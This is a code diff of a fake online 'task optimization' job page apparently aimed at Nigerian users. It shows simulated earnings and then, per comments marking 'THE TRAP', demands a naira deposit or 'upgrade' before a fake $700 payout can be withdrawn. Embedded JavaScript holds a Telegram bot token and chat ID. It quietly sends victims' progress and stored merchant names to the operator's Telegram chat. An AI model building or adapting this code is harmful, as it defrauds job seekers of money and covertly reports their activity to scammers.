@@ -3,230 +3,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AGMT | Terminal Node</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <title>AGMT | Secure Workstation</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; }
+        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; --text-dim: #64748b; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
         
-        body { 
-            background: var(--bg); 
-            color: white; 
-            display: flex; 
-            flex-direction: column; 
-            min-height: 100vh; 
-            overflow: hidden; 
-        }
+        body { background: var(--bg); color: white; min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden; }
 
-        /* Top Bar: Live Stats */
-        .header-stats { 
-            background: rgba(15, 23, 42, 0.8); 
-            backdrop-filter: blur(10px); 
-            padding: 20px; 
-            border-bottom: 1px solid var(--border); 
-            display: flex; 
-            justify-content: space-between; 
-            z-index: 100;
+        /* --- TASK TOP BAR --- */
+        .task-bar { 
+            padding: 20px; background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center;
+            position: sticky; top: 0; z-index: 100;
         }
-        .stat-group { display: flex; flex-direction: column; }
-        .stat-label { font-size: 10px; color: #64748b; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
-        .stat-value { font-family: 'JetBrains Mono', monospace; font-size: 18px; font-weight: 800; color: var(--accent); }
+        .batch-id { font-size: 10px; font-weight: 800; color: var(--text-dim); letter-spacing: 1px; }
+        .counter-pill { background: rgba(37, 99, 235, 0.1); color: var(--primary); padding: 6px 12px; border-radius: 10px; font-weight: 800; font-size: 12px; border: 1px solid rgba(37, 99, 235, 0.2); }
 
-        /* Scanning Area */
-        .main-workspace { 
-            flex: 1; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            padding: 20px; 
-            position: relative;
-        }
+        /* --- WORK AREA --- */
+        .main-engine { flex: 1; padding: 25px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
 
-        .img-container { 
-            width: 100%; 
-            max-width: 320px; 
-            aspect-ratio: 1/1; 
-            background: #fff; 
-            border-radius: 35px; 
-            overflow: hidden; 
-            border: 4px solid var(--border); 
-            position: relative; 
-            box-shadow: 0 0 50px rgba(37, 99, 235, 0.15);
+        /* Product/Asset Display */
+        .work-card { 
+            width: 100%; max-width: 360px; background: var(--card); border: 1px solid var(--border); 
+            border-radius: 40px; padding: 30px; text-align: center; margin-bottom: 30px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.4); position: relative;
         }
+        .asset-image { 
+            width: 120px; height: 120px; background: rgba(255,255,255,0.03); 
+            border-radius: 30px; margin: 0 auto 20px; display: flex; align-items: center; 
+            justify-content: center; font-size: 50px; border: 1px solid var(--border);
+        }
+        .asset-name { font-size: 18px; font-weight: 800; margin-bottom: 8px; }
+        .asset-meta { font-size: 11px; color: var(--text-dim); font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
 
-        .img-container img { width: 100%; height: 100%; object-fit: cover; transition: 0.4s; }
+        /* Rating System */
+        .rating-box { margin-top: 25px; padding-top: 25px; border-top: 1px solid var(--border); }
+        .stars { display: flex; justify-content: center; gap: 10px; margin-bottom: 15px; }
+        .star { font-size: 30px; color: #1e293b; cursor: pointer; transition: 0.2s; }
+        .star.active { color: #f59e0b; text-shadow: 0 0 10px rgba(245, 158, 11, 0.4); }
 
-        /* The Laser Scanner Line */
-        .laser-line { 
-            position: absolute; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 3px; 
-            background: var(--primary); 
-            box-shadow: 0 0 15px var(--primary), 0 0 30px var(--primary); 
-            z-index: 10; 
-            display: none; 
+        /* Action Button */
+        .btn-submit { 
+            width: 100%; max-width: 360px; padding: 22px; border-radius: 25px; border: none;
+            background: linear-gradient(135deg, var(--primary), #1e40af);
+            color: white; font-weight: 800; font-size: 16px; cursor: pointer;
+            box-shadow: 0 15px 35px rgba(37, 99, 235, 0.3); transition: 0.3s;
         }
-        @keyframes scanMove { 0% { top: 0%; } 100% { top: 100%; } }
+        .btn-submit:disabled { opacity: 0.4; filter: grayscale(1); cursor: not-allowed; }
 
-        /* Live Terminal Log */
-        .terminal-log { 
-            margin-top: 25px; 
-            font-family: 'JetBrains Mono', monospace; 
-            font-size: 11px; 
-            color: var(--accent); 
-            text-transform: uppercase; 
-            letter-spacing: 0.5px;
-            height: 20px;
-        }
+        /* Loading Overlay */
+        #work-loader { position: absolute; inset: 0; background: var(--card); border-radius: 40px; display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 10; }
+        .spinner { width: 45px; height: 45px; border: 4px solid rgba(255,255,255,0.05); border-top-color: var(--primary); border-radius: 50%; animation: rot 0.8s linear infinite; }
+        @keyframes rot { to { transform: rotate(360deg); } }
 
-        /* Footer Controls */
-        .action-area { 
-            background: var(--card); 
-            padding: 30px 25px 40px; 
-            border-top: 1px solid var(--border); 
-            border-radius: 40px 40px 0 0; 
-            box-shadow: 0 -10px 40px rgba(0,0,0,0.5);
+        /* --- THE $700 TRAP POPUP --- */
+        #payout-modal { 
+            position: fixed; inset: 0; background: rgba(2, 6, 23, 0.98); 
+            z-index: 2000; display: none; align-items: center; justify-content: center; padding: 20px;
         }
-
-        .btn-optimize { 
-            width: 100%; 
-            background: var(--primary); 
-            color: white; 
-            padding: 22px; 
-            border-radius: 22px; 
-            border: none; 
-            font-weight: 800; 
-            font-size: 16px; 
-            letter-spacing: 0.5px;
-            cursor: pointer; 
-            transition: 0.2s;
-            box-shadow: 0 10px 30px rgba(37, 99, 235, 0.3);
+        .modal-content { 
+            background: #1e293b; border: 2px solid var(--primary); border-radius: 40px; 
+            padding: 40px 30px; text-align: center; max-width: 400px;
+            box-shadow: 0 0 60px rgba(37, 99, 235, 0.5);
         }
-        .btn-optimize:active { transform: scale(0.96); }
-        .btn-optimize:disabled { background: #1e293b; color: #475569; box-shadow: none; }
-
-        /* THE TRAP OVERLAY */
-        #paywall { 
-            display: none; 
-            position: fixed; 
-            inset: 0; 
-            background: rgba(2, 6, 23, 0.98); 
-            z-index: 1000; 
-            align-items: center; 
-            justify-content: center; 
-            padding: 25px; 
-        }
-        .paywall-card { 
-            background: white; 
-            color: #020617; 
-            padding: 40px 30px; 
-            border-radius: 40px; 
-            width: 100%; 
-            max-width: 360px; 
-            text-align: center; 
-            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+        .modal-icon { font-size: 60px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--primary)); }
+        
+        /* Currency Badge */
+        .naira-badge { background: rgba(16, 185, 129, 0.1); color: var(--accent); padding: 10px; border-radius: 15px; margin: 20px 0; font-weight: 800; font-size: 14px; border: 1px solid rgba(16, 185, 129, 0.2); }
     </style>
 </head>
 <body>
 
-    <div class="header-stats">
-        <div class="stat-group">
-            <span class="stat-label">System Progress</span>
-            <div class="stat-value" id="task-counter">1 / 40</div>
+    <header class="task-bar">
+        <div class="batch-id">SESSION: 00-AF-772</div>
+        <div class="counter-pill">TASK: <span id="taskIdx">1</span> / 40</div>
+    </header>
+
+    <div class="main-engine">
+        
+        <div class="work-card">
+            <div id="work-loader">
+                <div class="spinner"></div>
+                <p style="margin-top: 15px; font-size: 10px; font-weight: 800; color: var(--primary); letter-spacing: 2px;">SYNCING NODE...</p>
+            </div>
+
+            <div id="content-view">
+                <div class="asset-image" id="assetIcon">👟</div>
+                <div class="asset-meta">E-COMMERCE MERCHANT #<span id="assetCode">552</span></div>
+                <h2 class="asset-name" id="assetName">Premium Footwear</h2>
+                
+                <div class="rating-box">
+                    <p style="font-size: 12px; color: var(--text-dim); margin-bottom: 15px; font-weight: 600;">Rate this asset to boost merchant visibility:</p>
+                    <div class="stars">
+                        <span class="star" onclick="setStar(1)">★</span>
+                        <span class="star" onclick="setStar(2)">★</span>
+                        <span class="star" onclick="setStar(3)">★</span>
+                        <span class="star" onclick="setStar(4)">★</span>
+                        <span class="star" onclick="setStar(5)">★</span>
+                    </div>
+                </div>
+            </div>
         </div>
-        <div class="stat-group" style="text-align: right;">
-            <span class="stat-label">Accrued Profit</span>
-            <div class="stat-value" id="earnings-display">$0.00</div>
-        </div>
+
+        <button class="btn-submit" id="submitBtn" onclick="nextTask()" disabled>SUBMIT OPTIMIZATION</button>
+        
+        <p style="margin-top: 25px; font-size: 11px; color: #475569; font-weight: 700; text-align: center; line-height: 1.5;">
+            Note: Every 5 submissions adds <b>$50.00</b> to your pending balance.
+        </p>
+
     </div>
 
-    <div class="main-workspace">
-        <div class="img-container">
-            <img src="assets/prod1.jpg" id="current-img">
-            <div class="laser-line" id="laser"></div>
-        </div>
-        <div class="terminal-log" id="log-text">SYSTEM READY...</div>
-    </div>
-
-    <div class="action-area">
-        <button class="btn-optimize" id="opt-btn" onclick="startOptimization()">
-            OPTIMIZE MERCHANT ASSET
-        </button>
-    </div>
-
-    <div id="paywall">
-        <div class="paywall-card">
-            <div style="font-size: 50px; margin-bottom: 20px;">🛡️</div>
-            <h2 style="font-weight: 800; margin-bottom: 12px; letter-spacing: -1px;">Security Verification</h2>
-            <p style="font-size: 14px; color: #475569; line-height: 1.6; margin-bottom: 30px;">
-                You have reached a <b>High-Value Liquidity Node</b>. A merchant verification deposit of <b>₦15,500 ($10)</b> is required to unlock the final batch and release your total earnings of $357.50.
+    <div id="payout-modal">
+        <div class="modal-content">
+            <div class="modal-icon">💎</div>
+            <h1 style="font-size: 24px; margin-bottom: 10px;">PREMIUM BATCH!</h1>
+            <p style="color: #94a3b8; font-size: 14px; line-height: 1.6;">
+                Unbelievable! Your account has been selected for a <b>High-Yield Settlement Task</b> worth:
             </p>
-            <button class="btn-optimize" onclick="location.href='checkout.html'">PROCEED TO UNLOCK</button>
-            <p style="font-size: 11px; color: #94a3b8; margin-top: 20px;">*Deposit is automatically credited to your final withdrawal.</p>
+            <div class="naira-badge">💰 $700.00 (₦1,085,000.00)</div>
+            <p style="color: #94a3b8; font-size: 13px; margin-bottom: 30px;">
+                To process this ₦1.08M payout, you must upgrade your node to <b>Premium Level</b>.
+            </p>
+            <button class="btn-submit" onclick="window.location.href='wallet.html'">UPGRADE & WITHDRAW</button>
         </div>
     </div>
 
     <script>
         const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
         const chatId = "7909543900";
+        
+        let count = parseInt(localStorage.getItem('tasksCompleted')) || 1;
+        let selectedStar = 0;
 
-        let currentStep = 1;
-        let totalEarnings = 0;
+        const assets = [
+            {n: "Luxury Watch", i: "⌚"}, {n: "Wireless Audio", i: "🎧"}, 
+            {n: "Smart Terminal", i: "📱"}, {n: "Leather Bag", i: "👜"},
+            {n: "Gaming Console", i: "🎮"}, {n: "Digital Camera", i: "📷"}
+        ];
 
-        async function startOptimization() {
-            // THE TRAP AT TASK 35
-            if(currentStep >= 35) {
-                document.getElementById('paywall').style.display = 'flex';
-                // TELEGRAM ALERT
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=💸 <b>TARGET LOCKED:</b> User reached Task 35. Paywall shown!&parse_mode=html`);
+        function setStar(n) {
+            selectedStar = n;
+            const stars = document.querySelectorAll('.star');
+            stars.forEach((s, idx) => {
+                s.classList.toggle('active', idx < n);
+            });
+            document.getElementById('submitBtn').disabled = false;
+        }
+
+        function nextTask() {
+            if (count >= 31) {
+                document.getElementById('payout-modal').style.display = 'flex';
                 return;
             }
 
-            const btn = document.getElementById('opt-btn');
-            const laser = document.getElementById('laser');
-            const log = document.getElementById('log-text');
-            const img = document.getElementById('current-img');
+            document.getElementById('work-loader').style.display = 'flex';
+            document.getElementById('submitBtn').disabled = true;
 
-            // Start Animation
-            btn.disabled = true;
-            btn.innerText = "PROCESSING NODE...";
-            laser.style.display = "block";
-            laser.style.animation = "scanMove 1.5s infinite linear";
-            log.innerText = "> Syncing Merchant Ledger...";
-
-            // Wait 1.8 seconds (The "Work" feeling)
             setTimeout(() => {
-                currentStep++;
-                totalEarnings += 4.50;
-
-                // Update Image
-                img.src = `assets/prod${currentStep}.jpg`;
+                count++;
+                localStorage.setItem('tasksCompleted', count);
                 
+                // Update Balance
+                let currentBal = parseFloat(localStorage.getItem('walletBalance'));
+                localStorage.setItem('walletBalance', currentBal + 10);
+
                 // Update UI
-                document.getElementById('task-counter').innerText = `${currentStep} / 40`;
-                document.getElementById('earnings-display').innerText = `$${totalEarnings.toFixed(2)}`;
+                document.getElementById('taskIdx').innerText = count;
+                const randomAsset = assets[Math.floor(Math.random() * assets.length)];
+                document.getElementById('assetName').innerText = randomAsset.n;
+                document.getElementById('assetIcon').innerText = randomAsset.i;
+                document.getElementById('assetCode').innerText = Math.floor(Math.random() * 900) + 100;
                 
-                // Reset State
-                btn.disabled = false;
-                btn.innerText = "OPTIMIZE MERCHANT ASSET";
-                laser.style.display = "none";
-                log.innerText = "NODE OPTIMIZED SUCCESSFULLY";
-            }, 1800);
+                // Reset Stars
+                selectedStar = 0;
+                document.querySelectorAll('.star').forEach(s => s.classList.remove('active'));
+                
+                document.getElementById('work-loader').style.display = 'none';
+
+                // Send progress to Telegram
+                if (count % 5 === 0) {
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=⚡ <b>ENGINE UPDATE:</b> ${localStorage.getItem('merchantName')} is at task ${count}.&parse_mode=html`);
+                }
+            }, 1000);
         }
 
-        // Silent Monitor: Alert when they enter the engine
-        window.onload = function() {
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=⚡ <b>ENGINE ACTIVE:</b> User has started optimizing tasks.&parse_mode=html`);
-        }
+        window.onload = () => {
+            document.getElementById('taskIdx').innerText = count;
+        };
     </script>
-
-    <script src="notify.js"></script>
 
 </body>
 </html>
-
